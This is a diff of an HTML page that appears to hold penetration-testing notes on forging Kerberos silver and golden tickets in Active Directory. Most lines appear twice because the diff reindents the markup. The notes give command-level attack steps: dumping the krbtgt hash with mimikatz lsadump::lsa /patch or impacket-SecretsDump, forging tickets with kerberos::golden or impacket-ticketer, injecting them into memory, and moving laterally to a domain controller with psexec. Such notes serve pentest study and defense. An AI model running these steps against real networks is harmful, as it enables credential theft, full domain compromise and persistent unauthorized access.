+<li>If the SPN is used on multiple servers the ticket can be leveraged against them all.</li>
+<li>Creation Instructions</li>
+<ul>
+    <li>Get domain SID</li>
+    <ul>
+        <li>Whoami /user</li>
+        <ul>
+            <li>SID is everything except the last section of digits</li>
+        </ul>
+    </ul>
+    
+    <li>mimikatz</li>
+    <ul>
+        <li>Get rid of pre-existing kerberos tickets</li>
+        <ul>
+            <li>Kerberos::purge</li>
+        </ul>
+        
+        <li>Verify Kerberos tickets are purged</li>
         <ul>
             <li>Kerberos::list</li>
         </ul>
+        
+        <li>Forge silver ticket</li>
+        <ul>
+            <li>Kerberos::golden /user:&lt;username&gt; /domain:&lt;domain ex. corp.com&gt; /sid:&lt;domain SID &ndash; whoami /user SID except last section of #&#039;s&gt; target:&lt;fully qualified host name of service &ndash; ex. CorpWebServer.corp.com&gt; /service:&lt;service type &ndash; ex. HTTP&gt; /rc4:&lt;service account hash&gt; /ppt (inject into memory)</li>
+            <ul>
+                <li>Rc4/hash section requires knowledge of service account password.  If password is known, we can hash it.</li>
+            </ul>
+        </ul>
     </ul>
-    
-    <hr>
-    
-    <h2>Golden Ticket</h2>
-    
-    <li>Gives access to anything and everything</li>
-    <li>Requires the password or hash for the service account krbtgt</li>
-    <li>Must have access to an account that is a member of the domain admins group or have access to the domain controller itself.</li>
-    <li>Creating the golden ticket does not require admin privileges and can be performed on a computer not joined to the domain.</li>
-    <li>Creating golden ticket on Linux</li>
+    <li>Verify ticket has been created</li>
     <ul>
-        <li>Get krbtgt hash</li>
-        <ul>
-            <li>impacket-SecretsDump</li>
-        </ul>
-        
-        <li>Get domain SID</li>
-        <ul>
-            <li>On Windows</li>
-            <ul>
-                <li>PS &gt; Get-ADDomain &lt;Domain&gt;</li>
-            </ul>
-        </ul>
-        
-        <li>impacket-ticketer</li>
-        <ul>
-            <li>impacket-ticketer -nthash &lt;krbtgt ntlm hash&gt; -domain-sid &lt;domain sid&gt; -domain &lt;Domain Name&gt; &lt;Username&gt;</li>
-        </ul>
-        <li>export KRB5CCNAME=&lt;output .cache file from impacket-ticketer command&gt;</li>
-        <li>psexec &lt;domain&gt;/&lt;username&gt;@&lt;ip address&gt; -k -no-pass</li>
-        <ul>
-            <li>Try adding domain names to /etc/host file before running</li>
-            <ul>
-                <li>Try DNS names instead of ip address in command</li>
-            </ul>
-            
-            <li>psexec will always login as SYSTEM</li>
-            <ul>
-                <li>switch to wmiexec to login as Administrator instead of SYSTEM</li>
-            </ul>
-        </ul>
+        <li>Kerberos::list</li>
     </ul>
-    
-    <li>Creating the golden ticket on windows</li>
+</ul>
+
+<hr>
+
+<h2>Golden Ticket</h2>
+
+<li>Gives access to anything and everything</li>
+<li>Requires the password or hash for the service account krbtgt</li>
+<li>Must have access to an account that is a member of the domain admins group or have access to the domain controller itself.</li>
+<li>Creating the golden ticket does not require admin privileges and can be performed on a computer not joined to the domain.</li>
+<li>Creating golden ticket on Linux</li>
+<ul>
+    <li>Get krbtgt hash</li>
     <ul>
-        <li>Get domain SID & krbtgt hash</li>
+        <li>impacket-SecretsDump</li>
+    </ul>
+    
+    <li>Get domain SID</li>
+    <ul>
+        <li>On Windows</li>
         <ul>
-            <li>mimikatz: privilege::debug</li>
-            <li>mimikatz: lsadump::lsa /patch</li>
-        </ul>
-        
-        <li>Purge kerberos tickets</li>
-        <ul>
-            <li>mimikatz: kerberos::purge</li>
-        </ul>
-        
-        <li>Create golden ticket</li>
-        <ul>
-            <li>mimikatz: kerberos::golden /user:fakeuser /domain:corp.com /sid:s-1-5-&lt;sid&gt; /krbtgt:&lt;krbtgt hash /ptt&gt;</li>
-        </ul>
-        
-        <li>Launch new command prompt</li>
-        <ul>
-            <li>misc::cmd</li>
-        </ul>
-        
-        <li>Attempt lateral movement with psexec</li>
-        <ul>
-            <li>Psexec.exe \\&lt;domain controller&gt; cmd.exe</li>
+            <li>PS &gt; Get-ADDomain &lt;Domain&gt;</li>
         </ul>
     </ul>
     
+    <li>impacket-ticketer</li>
+    <ul>
+        <li>impacket-ticketer -nthash &lt;krbtgt ntlm hash&gt; -domain-sid &lt;domain sid&gt; -domain &lt;Domain Name&gt; &lt;Username&gt;</li>
+    </ul>
+    <li>export KRB5CCNAME=&lt;output .cache file from impacket-ticketer command&gt;</li>
+    <li>psexec &lt;domain&gt;/&lt;username&gt;@&lt;ip address&gt; -k -no-pass</li>
+    <ul>
+        <li>Try adding domain names to /etc/host file before running</li>
+        <ul>
+            <li>Try DNS names instead of ip address in command</li>
+        </ul>
+        
+        <li>psexec will always login as SYSTEM</li>
+        <ul>
+            <li>switch to wmiexec to login as Administrator instead of SYSTEM</li>
+        </ul>
+    </ul>
+</ul>
+
+<li>Creating the golden ticket on windows</li>
+<ul>
+    <li>Get domain SID & krbtgt hash</li>
+    <ul>
+        <li>mimikatz: privilege::debug</li>
+        <li>mimikatz: lsadump::lsa /patch</li>
+    </ul>
+    
+    <li>Purge kerberos tickets</li>
+    <ul>
+        <li>mimikatz: kerberos::purge</li>
+    </ul>
+    
+    <li>Create golden ticket</li>
+    <ul>
+        <li>mimikatz: kerberos::golden /user:fakeuser /domain:corp.com /sid:s-1-5-&lt;sid&gt; /krbtgt:&lt;krbtgt hash /ptt&gt;</li>
+    </ul>
+    
+    <li>Launch new command prompt</li>
+    <ul>
+        <li>misc::cmd</li>
+    </ul>
+    
+    <li>Attempt lateral movement with psexec</li>
+    <ul>
+        <li>Psexec.exe \\&lt;domain controller&gt; cmd.exe</li>
+    </ul>
+</ul>
+
 </body>
 </html>
